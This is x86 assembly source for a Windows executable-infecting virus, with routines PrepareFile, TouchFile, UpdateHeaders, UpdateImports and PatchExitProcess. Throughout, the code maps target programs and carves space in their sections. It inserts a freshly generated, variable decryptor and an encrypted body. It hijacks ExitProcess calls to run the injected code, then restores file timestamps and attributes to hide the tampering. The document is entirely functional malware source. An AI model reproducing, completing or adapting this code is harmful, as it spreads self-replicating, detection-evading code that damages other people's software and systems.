                mov     ebx, [ebp+LastHeader]
                mov     eax, [ebx+08h]
                add     eax, [ebx+0Ch]    
                mov     [ebp+RVA_TextHole], eax 
                mov     eax, [ebx+08h]      
                add     eax, [ebx+14h]      
                mov     [ebp+Phys_TextHole], eax
                mov     eax, 2000h          
                mov     [ebp+MaxSizeOfDecryptor], eax  
                add     [ebx+08h], eax
                add     [ebx+10h], eax
                add     [ebp+FileSize], eax
                mov     eax, [ebx+24h]
                                                              
                               
                and     eax, 0FDFFFFFFh 
                mov     [ebx+24h], eax

                jmp   @@GetDataHole


      @@CheckPaddingSpace:              
                mov     eax, [ebx+08h]  
                add     eax, [ebx+0Ch]  
                mov     [ebp+RVA_TextHole], eax  
                mov     eax, [ebx+08h]
                add     eax, [ebx+14h]
                mov     [ebp+Phys_TextHole], eax
                mov     eax, [ebx+10h]
                sub     eax, [ebx+08h]  
                mov     [ebp+MaxSizeOfDecryptor], eax 
                cmp     eax, 400h              
                jb    @@HoleAtLastSection      
                mov     ecx, eax
                mov     eax, [ebx+10h]
                add     eax, [ebx+0Ch]     
                cmp     eax, [ebx+28h+0Ch] 
                ja    @@Error              
                                           
                add     [ebx+08h], ecx     


      @@TextHoleMade:
                mov     ecx, [ebp+MaxSizeOfDecryptor]
                mov     edi, [ebp+Phys_TextHole]
                add     edi, [ebp+MappingAddress]
                xor     eax, eax
                and     ecx, 0FFFFFFFCh
      @@LoopFillHole:
                call    Random
                and     eax, 0FCh
                mov     [edi], eax  
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopFillHole

                mov     eax, [ebx+08h]  
                mov     esi, [ebp+HeaderAddress] 
                mov     [esi+1Ch], eax           

      @@GetDataHole:
                mov     ebx, [ebp+LastHeader]
                mov     eax, [ebp+RoundedSizeOfNewCode]
                add     [ebp+FileSize], eax
                mov     ecx, [ebx+24h]
                and     ecx, 80000000h
                or      ecx, ecx
                jnz   @@Error              
                mov     ecx, [ebx+10h]
                add     ecx, [ebx+14h]          
                mov     [ebp+Phys_DataHole], ecx 
                mov     ecx, [ebx+10h]
                add     ecx, [ebx+0Ch]
                mov     [ebp+RVA_DataHole], ecx
                add     eax, [ebx+10h]
                mov     [ebx+10h], eax           
                mov     [ebx+08h], eax

      @@AllHolesPrepared:
                mov     esi, [ebp+HeaderAddress] 
                mov     eax, [ebx+0Ch]           
                add     eax, [ebx+08h]           
                mov     [esi+50h], eax


                mov     edx, [ebp+ExitProcessAddress] 
                mov     ebx, [ebp+TextHeader]         
                mov     esi, [ebx+14h]                
                add     esi, [ebp+MappingAddress]
                mov     ecx, [ebx+10h]
                sub     ecx, 6

      @@LoopFindExitProcess:                  
                mov     eax, [esi]            
                and     eax, 0FFh             
                cmp     eax, 0FFh
                jnz   @@NextInstruction
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 25h        
                jz    @@JMPMemFound     
                cmp     eax, 15h        
                jnz   @@NextInstruction 
      @@JMPMemFound:                    
                mov     eax, [esi+2]
                cmp     eax, edx
                jnz   @@NextInstruction
      
                add     esi, 2           
                push    edx              
                mov     edx, [ebp+HeaderAddress] 
                mov     edx, [edx+34h]           
                add     edx, [ebp+RVA_TextHole]  
                call    PatchExitProcess
                pop     edx
                add     esi, 4
      @@NextInstruction:
                add     esi, 1           
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopFindExitProcess

                xor     eax, eax         
                ret
PrepareFile     endp

TouchFile       proc
                mov     [ebp+Addr_FilePath], edx 

                push    eax
                push    ecx
                push    edx  

                push    edx
                call    dword ptr [ebp+RVA_GetFileAttributesA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue] 
                cmp     eax, -1                
                jz    @@Error_
                mov     [ebp+FileAttributes], eax 

                push    eax
                push    ecx
                push    edx  
                push    80h
                mov     eax, [ebp+Addr_FilePath]  
                push    eax
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error_               

                push    eax
                push    ecx
                push    edx  

                push    0
                push    0
                push    3          
                push    0
                push    0
                push    0C0000000h 
                push    edx
                call    dword ptr [ebp+RVA_CreateFileA] 
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                cmp     eax, -1           
                jz    @@Error
                mov     [ebp+hFile], eax

                push    eax
                push    ecx
                push    edx  

                push    0
                push    eax
                call    dword ptr [ebp+RVA_GetFileSize]
                mov     [ebp+ReturnValue], eax
                pop     edx               
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2            
                mov     [ebp+FileSize], eax          
                mov     [ebp+OriginalFileSize], eax  

                push    eax
                push    ecx
                push    edx  

                push    0
                add     eax, [ebp+RoundedSizeOfNewCode]
                add     eax, 2000h 
                push    eax
                push    0
                push    4  
                push    0
                mov     eax, [ebp+hFile]      
                push    eax                   
                call    dword ptr [ebp+RVA_CreateFileMappingA] 
                mov     [ebp+ReturnValue], eax   
                pop     edx                      
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error2                
                mov     [ebp+hMapping], eax

                push    eax
                push    ecx
                push    edx  

                push    0
                push    0
                push    0
                push    0F001Fh
                push    eax
                call    dword ptr [ebp+RVA_MapViewOfFile]
                mov     [ebp+ReturnValue], eax
                pop     edx                
                pop     ecx
                pop     eax  

                mov     eax, [ebp+ReturnValue]
                or      eax, eax
                jz    @@Error3             

                mov     dword ptr [ebp+MappingAddress], eax 
                xor     eax, eax        
                mov     [ebp+NumberOfUndoActions], eax 
                                                
                call    PrepareFile    
                or      eax, eax       
                jnz   @@Error4         

                mov     ebx, [ebp+MappingAddress] 
                add     ebx, [ebp+Phys_TextHole]  
                                                  
               mov     ecx, [ebp+MaxSizeOfDecryptor] 
                cmp     ecx, 600h             
                jbe   @@SetSizeOfExpansionTo0 
                mov     eax, 1                
                call    Random
                and     eax, 1
                jz    @@SetSizeOfExpansionTo0 
                                              
                                              
                mov     eax, -1               
                jmp   @@SetSizeOfExpansion    
      @@SetSizeOfExpansionTo0:
                mov     eax, 2
                call    Random
                and     eax, 1
                jz    @@SetSizeOfExpansionTo1 
                xor     eax, eax              
                jmp   @@SetSizeOfExpansion
      @@SetSizeOfExpansionTo1:
                mov     eax, 1
      @@SetSizeOfExpansion:
                mov     [ebp+SizeOfExpansion], eax 
                                                

      @@CheckWithOtherSizeOfExpansion:
                mov     ecx, 9         
                                       
                                       
      @@GenerateOther:
                push    ecx            
                mov     edi, [ebp+DecryptorPseudoCode] 
                mov     eax, [ebp+VirtualAllocAddress] 
                push    eax
                call    MakeDecryptor    
                pop     eax              
                mov     [ebp+VirtualAllocAddress], eax
                pop     ecx             
                sub     ecx, 1          
                mov     eax, [ebp+SizeOfDecryptor] 
                cmp     eax, [ebp+MaxSizeOfDecryptor] 
                jbe   @@SizeOfDecryptorOK             
                or      ecx, ecx                   
                jnz   @@GenerateOther              
                mov     eax, [ebp+SizeOfExpansion] 
                cmp     eax, 2             
                jz    @@InsertExitProcess  
                      
                add     eax, 1             
                mov     [ebp+SizeOfExpansion], eax  
                jmp   @@CheckWithOtherSizeOfExpansion 

        
      @@InsertExitProcess:
                mov     edi, [ebp+Phys_TextHole]    
                add     edi, [ebp+MappingAddress]   
                mov     eax, 6Ah
                mov     [edi], eax          
                add     edi, 2
            
            
            
                mov     eax, 15FFh          
                mov     [edi], eax
                add     edi, 2
                mov     eax, [ebp+ExitProcessAddress]
                mov     [edi], eax
                jmp   @@Exit

      @@SizeOfDecryptorOK:           
                mov     esi, [ebp+AssembledDecryptor]  
                mov     edi, [ebp+Phys_TextHole]
                add     edi, [ebp+MappingAddress]
                mov     ecx, [ebp+SizeOfDecryptor]
      @@LoopCopyDecryptor:
                mov     eax, [esi]       
                mov     [edi], eax
                add     esi, 1
                add     edi, 1
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopCopyDecryptor

                mov     edx, 30h         
                                         
                mov     esi, [ebp+MaxSizeOfDecryptor]
                sub     esi, [ebp+SizeOfDecryptor]
                and     esi, 0FFFFFFFCh    
                or      esi, esi           
                jz    @@ContinueWithTheRest 
       @@CheckAgainThePossibility:
                call    Random      
                and     eax, 0FCh
                or      eax, eax    
                jz    @@CheckAgainThePossibility
                sub     edx, 1      
                                    
                cmp     eax, esi    
                jb    @@FillRandomBytes 
                or      edx, edx        
                jnz   @@CheckAgainThePossibility 
                jmp   @@ContinueWithTheRest      
      @@FillRandomBytes:
                mov     ecx, eax    
      @@LoopFillRandomBytes:
                call    Random
                mov     [edi], eax  
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx    
                jnz   @@LoopFillRandomBytes 

      @@ContinueWithTheRest:
                mov     edi, [ebp+MappingAddress] 
                add     edi, [ebp+Phys_DataHole]  
                cmp     edi, [ebp+MappingAddress] 
                jz    @@Exit
                mov     edx, [ebp+TypeOfEncryption] 
                mov     ebx, [ebp+EncryptionKey]    
                mov     esi, [ebp+NewAssembledCode] 
                mov     ecx, [ebp+SizeOfNewCode]    
                and     ecx, 0FFFFFFFCh
                add     ecx, 4             
     @@LoopEncryptCode:
                mov     eax, [esi]
                or      ebx, ebx           
                jz    @@NoEncryption       
                or      edx, edx
                jz    @@ADDKey
                cmp     edx, 1
                jz    @@SUBKey
        @@XORKey:
                xor     eax, ebx
                jmp   @@StoreDWORD
        @@ADDKey:
                add     eax, ebx
                jmp   @@StoreDWORD
        @@SUBKey:
                sub     eax, ebx
        @@NoEncryption:
        @@StoreDWORD:
                mov     [edi], eax         
                add     esi, 4             
                add     edi, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopEncryptCode
                xor     eax, eax
                mov     [edi], eax         

     @@Exit:    mov     ebx, [ebp+HeaderAddress]
                call    Random
                and     eax, 0FFFFFCh
                mov     [ebx+58h], eax    
                                          
                xor     edi, edi    
                jmp   @@NoError

     
     @@Error4:  call    UndoChanges  
                mov     edi, 1       

    @@NoError:  push    eax          
                push    ecx
                push    edx 
                mov     eax, [ebp+MappingAddress]
                push    eax
                call    dword ptr [ebp+RVA_UnmapViewOfFile]
                pop     edx
                pop     ecx
                pop     eax 
                jmp   @@NoError3

     
     @@Error3:  mov     edi, 1       
     @@NoError3:
                push    eax          
                push    ecx
                push    edx 
                mov     eax, [ebp+hMapping]
                push    eax
                call    dword ptr [ebp+RVA_CloseHandle]
                pop     edx
                pop     ecx
                pop     eax 
                jmp   @@NoError2
    
    @@Error2:   mov     edi, 1       
    @@NoError2:
                push    eax          
                push    ecx          
                push    edx          
                xor     eax, eax
                push    eax 
                push    eax 
                or      edi, edi
                jnz   @@ThereWasAnError
                mov     eax, [ebp+FileSize]
                jmp   @@FixSize
    @@ThereWasAnError:
                mov     eax, [ebp+OriginalFileSize]
    @@FixSize:  push    eax
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetFilePointer]
                pop     edx
                pop     ecx
                pop     eax  

                push    eax          
                push    ecx
                push    edx  
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetEndOfFile]
                pop     edx
                pop     ecx
                pop     eax  

   @@DontFixSize:
                push    eax          
                push    ecx          
                push    edx  

                mov     eax, [ebp+FindFileData]
                add     eax, 14h
                push    eax
                sub     eax, 8
                push    eax
                sub     eax, 8
                push    eax
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_SetFileTime]
                pop     edx
                pop     ecx
                pop     eax  

                push    eax          
                push    ecx
                push    edx  
                mov     eax, [ebp+hFile]
                push    eax
                call    dword ptr [ebp+RVA_CloseHandle]
                pop     edx
                pop     ecx
                pop     eax  

     @@Error:   push    eax          
                push    ecx
                push    edx  
                mov     eax, [ebp+FileAttributes]
                push    eax
                mov     eax, [ebp+Addr_FilePath]
                push    eax
                call    dword ptr [ebp+RVA_SetFileAttributesA]
                pop     edx
                pop     ecx
                pop     eax  
     @@Error_:  ret
TouchFile       endp


UpdateArrayOfRVAs proc
                or      eax, eax       
                jz    @@UpdateArray_OK
                or      edx, edx       
                jz    @@UpdateArray_OK 
                push    ebx
                mov     ebx, eax       
                call    TranslateVirtualToPhysical
                mov     eax, ebx
                pop     ebx
                or      eax, eax       
                jz    @@UpdateArray_Updated01
        @@UpdateArrayLoop_01:
                cmp     [eax], edi          
                jb    @@UpdateArray_Updated01 
                add     [eax], ecx
        @@UpdateArray_Updated01:
                add     eax, 4
                dec     edx
                or      edx, edx
                jnz   @@UpdateArrayLoop_01
        @@UpdateArray_OK:
                ret
UpdateArrayOfRVAs endp

UpdateHeaders   proc
                push    ecx                        
                mov     eax, [ebp+MakingFirstHole] 
                or      eax, eax
                jz    @@MakingDataHole      
                                            
                mov     eax, [esi+10h]
                cmp     eax, [esi+08h]  
                jbe   @@TextSizeOK      
                mov     [esi+08h], eax
        @@TextSizeOK:
                mov     edi, [esi+0Ch]
                add     edi, [esi+10h]  
                push    edi
                mov     eax, [esi+14h]
                add     eax, [esi+10h]  
                push    eax
                jmp   @@BeginUpdates    
        @@MakingDataHole:
                mov     edi, [esi+0Ch]
                push    edi             
                mov     eax, [esi+14h]
                push    eax

        @@BeginUpdates:

       
                     
        @@UpdateResources:
                mov     eax, [ebp+HeaderAddress]
                mov     ebx, [eax+88h]             
                or      ebx, ebx                   
                jz    @@UpdateImports
                call    TranslateVirtualToPhysical
                or      ebx, ebx
                jz    @@End                        

                mov     eax, [ebx+0Ch]    
                and     eax, 0FFFFh       
                mov     edx, [ebx+0Eh]
                and     edx, 0FFFFh
                add     edx, eax
                or      edx, edx
                jz    @@UpdateImports

                                
                mov     eax, ebx          
                add     eax, 10h
                call    UpdateResourceDir

        @@UpdateImports:
                call    UpdateImports     
                                          
                                          

                mov     eax, [ebp+GetModuleHandleAddress]
                or      eax, eax                   
                jz    @@End                        
                mov     eax, [ebp+GetProcAddressAddress]
                or      eax, eax
                jz    @@End
                mov     eax, [ebp+ExitProcessAddress]
                or      eax, eax
                jz    @@End

        @@UpdateExports:                          
                mov     eax, [ebp+HeaderAddress]  
                mov     ebx, [eax+78h]
                or      ebx, ebx                  
                jz    @@ExportsUpdated            
                call    TranslateVirtualToPhysical
                or      ebx, ebx                  
                jz    @@ExportsUpdated
                mov     eax, [ebx+0Ch]        
                cmp     eax, edi              
                jb    @@UpdateExportsOK_01    
                add     [ebx+0Ch], ecx
        @@UpdateExportsOK_01:
                mov     eax, [ebx+1Ch]
                mov     edx, [ebx+14h]
                call    UpdateArrayOfRVAs     
                mov     eax, [ebx+1Ch]        
                cmp     eax, edi
                jb    @@UpdateExportsOK_02
                add     [ebx+1Ch], ecx
        @@UpdateExportsOK_02:
                mov     eax, [ebx+20h]        
                mov     edx, [ebx+18h]
                call    UpdateArrayOfRVAs
                mov     eax, [ebx+20h]        
                cmp     eax, edi
                jb    @@UpdateExportsOK_03
                add     [ebx+20h], ecx
        @@UpdateExportsOK_03:

        @@ExportsUpdated:
        @@UpdateCodeSection:
                push    esi
                mov     eax, [ebp+RelocHeader]  
                mov     eax, [eax+14h]
                add     eax, [ebp+MappingAddress]
      @@LoopUpdate_00:
                mov     esi, [eax]          
                or      esi, esi            
                jz    @@AllUpdated
                mov     edx, 8
      @@LoopUpdate_01:
                cmp     edx, [eax+4]     
                jae   @@PageUpdated      
                                         
                add     eax, edx
                mov     ebx, [eax]
                sub     eax, edx         
                and     ebx, 0FFFFh
                add     edx, 2
                cmp     ebx, 2FFFh       
                jbe   @@LoopUpdate_01    
                and     ebx, 0FFFh
                add     ebx, [eax]       
                mov     esi, [ebp+MakingFirstHole]
                or      esi, esi          
                jnz   @@UpdateCodeSec_Cont00    
                cmp     ebx, [ebp+RVA_TextHole] 
                jb    @@UpdateCodeSec_Cont00    
                add     ebx, [ebp+TextHoleSize]
      @@UpdateCodeSec_Cont00:
                call    TranslateVirtualToPhysical 
                or      ebx, ebx              
                jz    @@LoopUpdate_01
                push    eax
                push    edx                   
                mov     eax, [ebp+HeaderAddress] 
                mov     edx, [ebx]               
                sub     edx, [eax+34h]
                cmp     edx, edi          
                jb    @@TranslateOK_02    
                add     [ebx], ecx
                add     edx, ecx
        @@TranslateOK_02:


                mov     esi, [ebx-2]       
                and     esi, 0FFFFh
                cmp     esi, 15FFh
                jz    @@CheckExitProcess
                cmp     esi, 25FFh         
                jnz   @@ItsNotExitProcess  
        @@CheckExitProcess:
                cmp     edx, [ebp+ExitProcessAddress] 
                jnz   @@ItsNotExitProcess             
                mov     edx, [ebp+HeaderAddress]
                mov     edx, [edx+34h]
                add     edx, edi               
                push    esi
                mov     esi, ebx
                call    PatchExitProcess       
                pop     esi

                xor     eax, eax 

                pop     edx
                pop     eax

                push    eax
                add     eax, edx
                push    edx
                mov     edx, [eax-2]      
                and     edx, 0FFFF0000h   
                mov     [eax-2], edx
                pop     edx
                pop     eax
                jmp   @@LoopUpdate_01
      @@ItsNotExitProcess:
      @@TranslateOK:                      
                pop     edx
                pop     eax
                jmp   @@LoopUpdate_01
      @@PageUpdated:
                add     eax, [eax+4]
                jmp   @@LoopUpdate_00
      @@AllUpdated:
                pop     esi

                mov     eax, [ebp+MakingFirstHole]
                mov     ebx, [ebp+HeaderAddress]
                cmp     [ebx+0Ch], edi    
                jb    @@Fixed_01
                or      eax, eax
                jnz   @@NotFixed_01
                cmp     [ebx+0Ch], edi
                jz    @@Fixed_01
        @@NotFixed_01:
                add     [ebx+0Ch], ecx
        @@Fixed_01:
                cmp     [ebx+28h], edi    
                jb    @@Fixed_02
                or      eax, eax
                jnz   @@NotFixed_02
                cmp     [ebx+28h], edi
                jz    @@Fixed_02
        @@NotFixed_02:
                add     [ebx+28h], ecx
        @@Fixed_02:
                cmp     [ebx+2Ch], edi    
                jb    @@Fixed_03
                or      eax, eax
                jnz   @@NotFixed_03
                cmp     [ebx+2Ch], edi
                jz    @@Fixed_03
        @@NotFixed_03:
                add     [ebx+2Ch], ecx
        @@Fixed_03:
                cmp     [ebx+30h], edi    
                jb    @@Fixed_04
                or      eax, eax
                jnz   @@NotFixed_04
                cmp     [ebx+30h], edi
                jz    @@Fixed_04
        @@NotFixed_04:
                add     [ebx+30h], ecx
        @@Fixed_04:
                add     [ebx+50h], ecx    
                                          
      
                mov     edx, [ebp+HeaderAddress]        
                mov     edx, [edx+74h]                  
                mov     ebx, [ebp+HeaderAddress]
                add     ebx, 78h
                xor     eax, eax
       @@LoopDir_01:
                cmp     eax, 4            
                jz    @@NextDir_01        
                cmp     [ebx], edi
                jb    @@NextDir_01
                add     [ebx], ecx
       @@NextDir_01:
                add     ebx, 8
                inc     eax
                dec     edx
                or      edx, edx
                jnz   @@LoopDir_01
      
                mov     edx, [ebp+StartOfSectionHeaders]
                mov     ebx, [esi+14h]
                mov     eax, [ebp+MakingFirstHole]
                or      eax, eax
                jz    @@MakingDataHole_2
      @@MakingCodeHole_2:
                add     ebx, [esi+10h]  
      @@MakingDataHole_2:
                mov     eax, [ebp+HeaderAddress]
                mov     eax, [eax+6]
                and     eax, 0FFFFh     

                push    esi
                mov     esi, [ebp+MakingFirstHole]
      @@LoopUpdate_02:
                push    eax
                mov     eax, [edx+14h]  
                cmp     eax, ebx        
                jb    @@NextSection_00  
                or      esi, esi        
                jnz   @@NextSection_00_ 
                cmp     eax, ebx        
                jz    @@NextSection_00  
      @@NextSection_00_:                
                add     eax, ecx        
                mov     [edx+14h], eax
      @@NextSection_00:
                mov     eax, [edx+0Ch]
                cmp     eax, edi
                jb    @@NextSection_01
                or      esi, esi
                jnz   @@NextSection_01_
                cmp     eax, edi
                jz    @@NextSection_01
      @@NextSection_01_:
                add     eax, ecx
                mov     [edx+0Ch], eax
      @@NextSection_01:
                pop     eax             
                add     edx, 28h
                dec     eax
                or      eax, eax
                jnz   @@LoopUpdate_02
                pop     esi


     
                add     [esi+08h], ecx
                add     [esi+10h], ecx

                cmp     esi, [ebp+RelocHeader]
                jz    @@End

                push    ecx
                push    ebx          
                mov     edx, [ebp+MappingAddress]
                add     edx, [ebp+FileSize]
                sub     edx, 4
                mov     edi, edx
                add     edi, ecx
                pop     ecx
                add     ecx, [ebp+MappingAddress]

      @@Again:  mov     eax, [edx]   
                mov     [edi], eax
                sub     edx, 4
                sub     edi, 4
                cmp     edx, ecx
                jae   @@Again

                pop     ecx
                and     ecx, 0FFFFFFFCh
                shr     ecx, 2
                add     edx, 4

      @@Again2: call    Random
                and     eax, 0FCh
                mov     [edx], eax
                add     edx, 4
                dec     ecx
                or      ecx, ecx
                jnz   @@Again2

     @@End:     pop     eax
                pop     edi
                mov     ecx, 0 
                pop     ecx     
                ret             
                                
UpdateHeaders   endp


UpdateResourceDir proc
   @@UpdateResourceDir2:
                push    eax
                mov     eax, [eax+4]     
                and     eax, 80000000h   
                or      eax, eax
                jz    @@UpdateData
                pop     eax
                push    eax
                mov     eax, [eax+4]     
                and     eax, 7FFFFFFFh
                add     eax, ebx
                push    edx
                push    eax
                mov     edx, [eax+0Ch]   
                and     edx, 0FFFFh      
                mov     eax, [eax+0Eh]
                and     eax, 0FFFFh
                add     edx, eax
                pop     eax
                add     eax, 10h         
                call  @@UpdateResourceDir2
                pop     edx
                jmp   @@NextDir          
     @@UpdateData:
                pop     eax              
                push    eax
                mov     eax, [eax+4]
                add     eax, ebx
                mov     eax, [eax]  
                cmp     eax, edi    
                jb    @@UpdateOK
                pop     eax
                push    eax
                mov     eax, [eax+4]  
                add     eax, ebx      
                push    ebx
                mov     ebx, eax
                call    AddUndoAction
                pop     ebx
                add     [eax], ecx    
    @@UpdateOK:
     @@NextDir: pop     eax
                add     eax, 8        
                dec     edx           
                or      edx, edx      
                jnz   @@UpdateResourceDir2  
                ret
UpdateResourceDir endp

TranslateVirtualToPhysical proc
                push    ecx
                or      ebx, ebx
                jz    @@Error
                mov     ecx, [ebp+HeaderAddress]
                mov     ecx, [ecx+6]
                and     ecx, 0FFFFh    
                push    edx
                mov     edx, [ebp+StartOfSectionHeaders]
                push    eax
     @@LoopSection:
                mov     eax, [edx+0Ch] 
                cmp     ebx, eax       
                jb    @@NextSection
                add     eax, [edx+10h] 
                                       
                                       
                cmp     ebx, eax       
                jae   @@NextSection
                sub     ebx, [edx+0Ch] 
                add     ebx, [edx+14h] 
                pop     eax            
                pop     edx
                add     ebx, [ebp+MappingAddress] 
                pop     ecx
                ret                               
     @@NextSection:
                add     edx, 28h      
                dec     ecx
                or      ecx, ecx
                jnz   @@LoopSection
                pop     eax
                pop     edx
     @@Error:   xor     ebx, ebx      
                pop     ecx           
                ret
TranslateVirtualToPhysical endp

UpdateImports   proc
                push    esi
                mov     eax, [ebp+HeaderAddress] 
                mov     ebx, [eax+80h]
                or      ebx, ebx
                jz    @@ImportsUpdated
                call    TranslateVirtualToPhysical 
                or      ebx, ebx                   
                jz    @@ImportsUpdated
        @@UpdateImports_Loop00:
                mov     eax, [ebx+0Ch]  
                or      eax, eax        
                jz    @@ImportsUpdated
                cmp     eax, edi           
                jb    @@UpdateImportsOK_01
                add     ebx, 0Ch
                call    AddUndoAction
                add     [ebx], ecx      
                sub     ebx, 0Ch


        @@UpdateImportsOK_01:
                push    ebx             
                xor     ebx, ebx
                mov     [ebp+Kernel32Imports], ebx
                mov     ebx, eax
                call    TranslateVirtualToPhysical 
                or      ebx, ebx                   
                jz    @@UpdateImports_Next00
                mov     eax, [ebx]                 
                and     eax, 1F1F1F1Fh
                cmp     eax, 'nrek' AND 1F1F1F1Fh
                jnz   @@UpdateImports_Next00
                mov     eax, [ebx+4]
                and     eax, 0FFFF1F1Fh
                cmp     eax, '23le' AND 0FFFF1F1Fh
                jnz   @@UpdateImports_Next00
                mov     eax, 1                     
                mov     [ebp+Kernel32Imports], eax
        @@UpdateImports_Next00:
                pop     ebx


                mov     eax, [ebx]        
                or      eax, eax
                jz    @@UpdateImportsOK_04

                push    ebx               
                mov     ebx, eax          
                call    TranslateVirtualToPhysical
                mov     eax, ebx
                pop     ebx
                or      eax, eax
                jz    @@UpdateImportsOK_04
        @@UpdateImports_Loop01:
                mov     edx, [eax]        
                or      edx, edx
                jz    @@UpdateImportsOK_02
                cmp     edx, 80000000h             
                jae   @@UpdateImports_UpdatedOK    

                mov     esi, [ebp+Kernel32Imports] 
                or      esi, esi                   
                jz    @@UpdateImports_NotKernel32  
                push    ebx
                mov     ebx, edx
                call    TranslateVirtualToPhysical 
                or      ebx, ebx                   
                jz    @@UpdateImports_UnknownFunction
                mov     esi, [ebx+2]
                cmp     esi, 'tixE'                
                jz    @@UpdateImports_ExitProcess00
                cmp     esi, 'MteG'                
                jz    @@UpdateImports_GetModuleHandle00
                cmp     esi, 'PteG'                
                jz    @@UpdateImports_GetProcAddress00
                cmp     esi, 'triV'                
                jnz   @@UpdateImports_UnknownFunction
        @@UpdateImports_VirtualAlloc:
                mov     esi, [ebx+0Bh]
                cmp     esi, 'loc'
                jnz   @@UpdateImports_UnknownFunction
                xor     esi, esi                   
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_GetProcAddress00:
                mov     esi, [ebx+6]
                cmp     esi, 'Acor'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 1                     
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_ExitProcess00:
                mov     esi, [ebx+6]
                cmp     esi, 'corP'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 2                     
                jmp   @@UpdateImports_SaveFunctionAddress
        @@UpdateImports_GetModuleHandle00:
                mov     esi, [ebx+0Ah]
                cmp     esi, 'naHe'
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, [ebx+0Eh]
                cmp     esi, 'Aeld'               
                jz    @@UpdateImports_GetModuleHandleAFound
                cmp     esi, 'Weld'               
                jnz   @@UpdateImports_UnknownFunction
                mov     esi, 1
                jmp   @@UpdateImports_GetModuleHandleFound
        @@UpdateImports_GetModuleHandleAFound:
                xor     esi, esi
        @@UpdateImports_GetModuleHandleFound:
                mov     [ebp+GetModuleHandleMode], esi 
                mov     esi, 3                    
        @@UpdateImports_SaveFunctionAddress:
                pop     ebx
                
                
                push    ebx
                push    eax
                push    ebx
                mov     ebx, [ebx]              
                call    TranslateVirtualToPhysical
                sub     eax, ebx  
                pop     ebx
                add     eax, [ebx+10h]
                cmp     eax, edi         
                jb    @@UpdateImports_SetFunctionAddress
                add     eax, ecx
        @@UpdateImports_SetFunctionAddress:
                or      esi, esi                    
                jz    @@UpdateImports_SetVirtualAlloc
                cmp     esi, 1
                jz    @@UpdateImports_SetGetProcAddress
                cmp     esi, 2
                jz    @@UpdateImports_SetExitProcess
        @@UpdateImports_SetGetModuleHandle:
                mov     [ebp+GetModuleHandleAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetVirtualAlloc:
                mov     [ebp+VirtualAllocAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetGetProcAddress:
                mov     [ebp+GetProcAddressAddress], eax
                jmp   @@UpdateImports_FunctionSet
        @@UpdateImports_SetExitProcess:
                mov     [ebp+ExitProcessAddress], eax
        @@UpdateImports_FunctionSet:
                pop     eax
        @@UpdateImports_UnknownFunction:
        @@UpdateImports_Continue00:
                pop     ebx
        @@UpdateImports_NotKernel32:
                cmp     edx, edi
                jb    @@UpdateImports_UpdatedOK
                push    ebx
                mov     ebx, eax
                call    AddUndoAction         
                pop     ebx                   
                add     [eax], ecx
        @@UpdateImports_UpdatedOK:
                add     eax, 4                
                jmp   @@UpdateImports_Loop01

        @@UpdateImportsOK_02:
                mov     eax, [ebx]            
                cmp     eax, edi
                jb    @@UpdateImportsOK_03
                call    AddUndoAction
                add     [ebx], ecx
        @@UpdateImportsOK_03:
                add     ebx, 10h      
                mov     eax, [ebx]    
                cmp     eax, edi      
                jb    @@UpdateImportsOK_04_  
                                             
                call    AddUndoAction   
                add     eax, ecx
                mov     [ebx], eax
                sub     eax, ecx
        @@UpdateImportsOK_04_:
                sub     ebx, 10h
        @@UpdateImportsOK_04:
                add     ebx, 14h    
                jmp   @@UpdateImports_Loop00

        @@ImportsUpdated:
                pop     esi
                ret
UpdateImports   endp

PatchExitProcess proc
                push    eax
                mov     eax, 1
                call    Random
                and     eax, 1
                jz    @@PUSHRET
     @@IndirectDisplacement:         
                push    ecx
                mov     eax, [ebp+TextHeader]  
                mov     ecx, [eax+10h]         
                mov     eax, [eax+14h]
                add     eax, [ebp+MappingAddress]
                push    edx
                sub     ecx, 4
       @@LoopFindHole:
                sub     ecx, 1
                or      ecx, ecx
                jz    @@NotFound         
                mov     edx, [eax]       
                cmp     edx, 0CCCCCCCCh  
                jz    @@HoleFound
                add     eax, 1
                jmp   @@LoopFindHole
     @@NotFound:
                pop     edx             
                pop     ecx             
                jmp   @@PUSHRET
     @@HoleFound:
                pop     edx           
                mov     [eax], edx    
                mov     ecx, [esi+4]
                and     ecx, 0FFh     
                cmp     ecx, 0C3h     
                                      
                jz    @@RetInserted   
                sub     eax, [ebp+MappingAddress]
                mov     ecx, [ebp+TextHeader]
                sub     eax, [ecx+14h]       
                add     eax, [ecx+0Ch]
                mov     ecx, [ebp+HeaderAddress]
                add     eax, [ecx+34h]

                mov     [esi], eax           
                mov     eax, 25h             
                mov     [esi-1], al          
                pop     ecx
                jmp   @@Return
     @@RetInserted:
                mov     eax, 35h        
                mov     [esi-1], al     
                pop     ecx
                jmp   @@Return
     @@PUSHRET:                       
                mov     eax, 68h
                mov     [esi-2], eax
                mov     [esi-1], edx
                mov     eax, 0C3h
                mov     [esi+3], al

     @@Return:  pop     eax
                ret
